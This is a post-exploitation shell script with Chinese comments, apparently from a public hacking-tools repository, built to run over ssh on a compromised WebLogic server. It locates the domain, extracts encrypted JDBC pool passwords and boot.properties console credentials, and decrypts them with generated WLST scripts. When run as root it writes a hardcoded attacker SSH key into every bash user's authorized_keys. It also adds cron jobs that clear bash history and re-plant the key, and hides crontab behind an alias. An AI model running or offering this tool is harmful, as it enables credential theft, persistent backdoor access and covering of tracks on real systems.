# 后渗透，一键破解weblogic jdbc、console用户名及密码
# ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
# https://github.com/hktalent/myhktools 
set +e



if [ "$xKeys" = "" ];
then
  xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
fi

if [ "${WL_HOME}" != "" ];
then
   wlst=(${WL_HOME})
fi

echo "查找数据库连接"
netstat -antp|grep -E ":(1521|3306)"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):(1521|3306)"|sort -u

# doman
if [ "${DOMAIN_HOME}" != "" ];
then
   sdomain=${DOMAIN_HOME}
fi

if [ "${sdomain}" = "" ];
then
  sdomain=`ps -ef|grep domain|grep -v 'grep'|grep -Eo '([^ ]*?\.sh)'|sort -u`
fi
if [ "${sdomain}" = "" ];
then
   tpid=`ps -ef|grep java|grep  'weblogic.Server'|awk '{print $2}'`
   sdomain=`lsof -p $tpid |grep -Eo '([^ ]+/user_projects/domains/.*domain/)'|sort -u`
fi

if [ "${sdomain}" = "" ];
then
  tmp=`ps -ef|grep java|grep -Eo "(home=[^ ]+)"|sed  's/home=//g'|sed 's/\/wlserver.*$//g'|sort -u|head -n 1`;
  sdomain=`find ${tmp} -type d -name "domains"|grep 'user_projects'`
  cd "${sdomain}";
  cd "user_projects";
  cd "domains";
  sdomain=`pwd`
  if [ "${wlst}" = "" ];
  then
    wlst=(`echo ${sdomain}|sed 's/^\///g'|sed 's/\/.*//g'|xargs -I %  find /% -type f -name "wlst.sh"|sort -u`)
  fi
fi

# 精准找到wlst.*， 用于破解jdbc连接池密码
if [ "${wlst}" = "" ];
then
   wlst=(`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`)
fi
if [ "${wlst}" = "" ];
then
   wlst=(`echo ${sdomain}|sed 's/\/user_projects.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`)
fi

sdomain=`echo ${sdomain}|sed 's/domain\/.*$/domain/g'`
echo "wlst= ${wlst}"
echo "sdomain = ${sdomain}"

# 获得连接池配置密码加密串
echo "连接池信息"
find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"
enPswd=`find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`

if [ "${enPswd}" = "" ];
then
   enPswd=`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {}  -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
fi

if [ "${enPswd}" = "" ];
then
   enPswd=`echo ${sdomain}|sed 's/\/user_projects\/.*$/\/user_projects/g'|xargs -I {}  find {}  -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
fi

if [ "${enPswd}" != "" ];
then
echo "jdbc pool pswd: ${enPswd}"
# 获取破解后的密码
tmpFl=`mktemp`
cat <<EOT>${tmpFl}
import os
import weblogic.security.internal.SerializedSystemIni
import weblogic.security.internal.encryption.ClearOrEncryptedService
def decrypt(domainHomeName, encryptedPwd):
    domainHomeAbsolutePath = os.path.abspath(domainHomeName)
    encryptionService = weblogic.security.internal.SerializedSystemIni.getEncryptionService(domainHomeAbsolutePath)
    ces = weblogic.security.internal.encryption.ClearOrEncryptedService(encryptionService)
    clear = ces.decrypt(encryptedPwd)
    print "jdbc pool passwd:" + clear

try:
    if len(sys.argv) == 3:
        a = sys.argv[2].split()
        for i in a:
            try:
                decrypt(sys.argv[1], i)
            except:
                pass
    else:
        print "INVALID ARGUMENTS"
except:
    print "Unexpected error: ", sys.exc_info()[0]
    dumpStack()
    raise
EOT
echo "jdbc连接池密码..."

for i in ${wlst[@]}
do
  ${i} ${tmpFl}  ${sdomain} "${enPswd}"
done

fi


# 搜索weblogic console admin用户名及密码
export DOMAIN_HOME=${sdomain}
cd $DOMAIN_HOME/security
cd $DOMAIN_HOME/*_domain/security
echo "所有weblogic console 用户名及密码"
find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
cat <<EOT>./xxx.py
import os
from weblogic.security.internal import *
from weblogic.security.internal.encryption import *
encryptionService = SerializedSystemIni.getEncryptionService(".")
clearOrEncryptService = ClearOrEncryptedService(encryptionService)
for i in range(1, len(sys.argv)):
   pwd = sys.argv[i]
   # Delete unnecessary escape characters
   preppwd = pwd.replace("\\\\", "")
   try:
      print "Decrypted string is: " + clearOrEncryptService.decrypt(preppwd)
   except:
      pass

EOT
echo "开始破解weblogic console 用户名及密码"
for i in ${wlst[@]}
do
  find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${i} ./xxx.py
done
# find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
rm -rf ./xxx.py

# 获取jdbc配置信息
echo "all jdbc.properties:"
find ${sdomain} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"

if [ `whoami` = "root" ];
then
  szTmp1='mkdir {}/.ssh 2>/dev/null;echo "'${xKeys}'">{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'
  cat /etc/passwd|grep '/bash'|cut -d: -f6|xargs -I {} bash -c "${szTmp1}"
  echo "00 20 * * * cat /dev/null > ~/.bash_history" >/tmp/myX.sh
  echo '00 20 * * * mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>/tmp/myX.sh
  crontab -l >>/tmp/myX.sh
  `cat /tmp/myX.sh|sort -u | crontab -`
  `cat /tmp/myX.sh|sort -u | /usr/bin/crontab -`
  echo 'alias crontab=""'>>~/.bashrc
  alias crontab=""
fi
echo 'mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>~/.bashrc
rm -rf /tmp/myX.sh
rm -rf ${tmpFl}
